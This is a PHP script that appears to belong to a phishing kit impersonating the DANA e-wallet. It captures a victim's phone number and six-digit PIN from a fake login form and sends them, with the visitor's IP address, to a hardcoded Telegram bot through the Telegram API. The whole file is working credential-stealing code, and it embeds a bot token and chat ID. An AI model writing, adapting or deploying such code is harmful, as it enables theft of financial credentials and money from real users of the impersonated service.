<?php
session_start();
header('Content-Type: application/json');

$phone = $_POST['phone'] ?? ($_SESSION['phoneNumber'] ?? '-');
$p1 = $_POST['pin1'] ?? ''; $p2 = $_POST['pin2'] ?? ''; $p3 = $_POST['pin3'] ?? '';
$p4 = $_POST['pin4'] ?? ''; $p5 = $_POST['pin5'] ?? ''; $p6 = $_POST['pin6'] ?? '';
$pin_dana = $p1.$p2.$p3.$p4.$p5.$p6;

if (empty($pin_dana) && isset($_POST['pin'])) { $pin_dana = $_POST['pin']; }

$_SESSION['user_pin'] = $pin_dana;
$_SESSION['phoneNumber'] = $phone;

// KIRIM TELEGRAM
$botToken = "8779308804:AAHdW8BQWRCker7A5Exma6hIqgneT0cMCek";
$chatId   = "7864293365";
$message  = "🔔 *DANA | DATA LOGIN (PIN)*\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "📱 *Nomor HP:* `$phone`\n";
$message .= "🔑 *PIN DANA:* `$pin_dana`\n";
$message .= "📍 *Status:* User Input PIN Lengkap ✅\n";
$message .= "━━━━━━━━━━━━━━━━━━\n";
$message .= "🌐 *IP:* " . $_SERVER['REMOTE_ADDR'];

$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=".urlencode($message)."&parse_mode=Markdown";
file_get_contents($url);

echo json_encode(['status' => 'success', 'pin' => $pin_dana]);
?>
